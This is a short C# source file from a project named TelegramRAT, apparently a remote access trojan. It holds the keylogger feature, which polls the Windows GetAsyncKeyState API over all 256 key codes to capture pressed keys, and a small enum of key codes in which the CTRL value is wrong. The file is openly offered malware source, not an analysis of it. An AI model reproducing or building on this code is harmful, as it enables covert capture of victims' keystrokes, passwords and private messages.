using TelegramRAT.Utilities;

namespace TelegramRAT.Features;

static class Keylogger
{
    public static void GetPressingKeys(List<uint> keys)
    {
        keys.Clear();

        for (uint i = 0; i < 256; i++)
        {
            int state = WinAPI.GetAsyncKeyState(i);
            if (state != 0)
            {
                keys.Add(i);
            }
        }
    }

    enum VirtualKeyCodesTable
    {
        LBUTTON = 0x01,
        BACKSPACE = 0x08,
        TAB = 0x09,
        SHIFT = 0x10,
        CTRL = 0x21,
        CAPSLOCK = 0x14,
        ESC = 0x1B
    }
}
